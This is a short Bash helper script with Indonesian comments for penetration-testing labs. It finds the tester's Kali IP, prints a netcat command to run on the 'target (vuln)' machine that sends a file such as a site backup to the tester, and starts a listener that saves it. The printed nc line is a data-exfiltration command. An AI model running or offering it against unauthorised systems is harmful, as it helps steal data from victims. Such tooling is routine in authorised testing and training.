#!/bin/bash

# Warna untuk output
HIJAU='\e[1;32m'
BIRU='\e[1;34m'
KUNING='\e[1;33m'
MERAH='\e[1;31m'
RESET='\e[0m'

# ==========================================
# VALIDASI PARAMETER MANDATORY (NAMA FILE)
# ==========================================
if [ -z "$1" ]; then
  echo -e "${MERAH}[!] Error: Nama file wajib ditentukan!${RESET}"
  echo -e "${KUNING}Usage:${RESET}   $0 <nama_file> [port] [interface]"
  echo -e "${KUNING}Contoh:${RESET}"
  echo -e "  $0 sitebackup1.zip           # Otomatis deteksi IP aktif, Port: 443"
  echo -e "  $0 payload.exe 8000          # Otomatis deteksi IP aktif, Port: 8000"
  echo -e "  $0 exploit.py 443 eth0       # Paksa pakai IP dari eth0, Port: 443"
  exit 1
fi

FULL_PATH="$1"
FILE_NAME=$(basename "$FULL_PATH")
PORT=${2:-443}

# ==========================================
# AUTO-DETECT IP (SMART DETECTION)
# ==========================================
# Jika user tidak menentukan interface (parameter ke-3 kosong)
if [ -z "$3" ]; then
  # Cek tun0 dulu (prioritas VPN OSCP), menggunakan '\s+' agar kompatibel dengan multispasi
  IP_KALI=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ifconfig tun0 2>/dev/null | grep -oP '(?<=inet\s+)\d+(\.\d+){3}')
  INTERFACE="tun0"

  # Jika tun0 tidak ketemu, beralih ke eth0
  if [ -z "$IP_KALI" ]; then
    IP_KALI=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ifconfig eth0 2>/dev/null | grep -oP '(?<=inet\s+)\d+(\.\d+){3}')
    INTERFACE="eth0"
  fi

  # Jika eth0 juga tidak ketemu, beralih ke localhost
  if [ -z "$IP_KALI" ]; then
    IP_KALI="127.0.0.1"
    INTERFACE="lo"
  fi
else
  # Jika user menentukan interface secara spesifik lewat parameter ke-3
  INTERFACE="$3"
  IP_KALI=$(ip -4 addr show "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ifconfig "$INTERFACE" 2>/dev/null | grep -oP '(?<=inet\s+)\d+(\.\d+){3}')
  
  if [ -z "$IP_KALI" ]; then
    echo -e "${MERAH}[!] Error: Interface manual '$INTERFACE' tidak aktif!${RESET}"
    IP_KALI=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || ifconfig eth0 2>/dev/null | grep -oP '(?<=inet\s+)\d+(\.\d+){3}')
    INTERFACE="eth0"
    echo -e "${KUNING}[*] Fallback otomatis ke interface aktif: eth0 ($IP_KALI)${RESET}"
  fi
fi

# ==========================================
# OUTPUT & EKSEKUSI
# ==========================================
echo -e "${BIRU}===============================================${RESET}"
echo -e "${BIRU}      NETCAT TRANSFER HELPER (IFACE: $INTERFACE)       ${RESET}"
echo -e "${BIRU}===============================================${RESET}"

# Cetak command untuk di-copypaste ke target
echo -e "${HIJAU}[+] RUN INI DI MESIN TARGET (VULN):${RESET}"
echo -e "${KUNING}nc $IP_KALI $PORT < $FILE_NAME${RESET}"
echo -e "${BIRU}-----------------------------------------------${RESET}"

# Jalankan listener di Kali
echo -e "${HIJAU}[*] Memulai Listener di Kali Linux (Port $PORT)...${RESET}"
echo -e "[*] Menyimpan file sebagai: ${HIJAU}$FILE_NAME${RESET}"
echo -e "${KUNING}[!] Tekan Ctrl+C jika transfer selesai atau ingin membatalkan.${RESET}\n"

# Menjalankan netcat listener (Gunakan sudo jika port < 1024)
if [ "$PORT" -lt 1024 ]; then
  sudo nc -nlvp "$PORT" | pv -abet > "$FILE_NAME"
else
  nc -nlvp "$PORT" | pv -abet > "$FILE_NAME"
fi
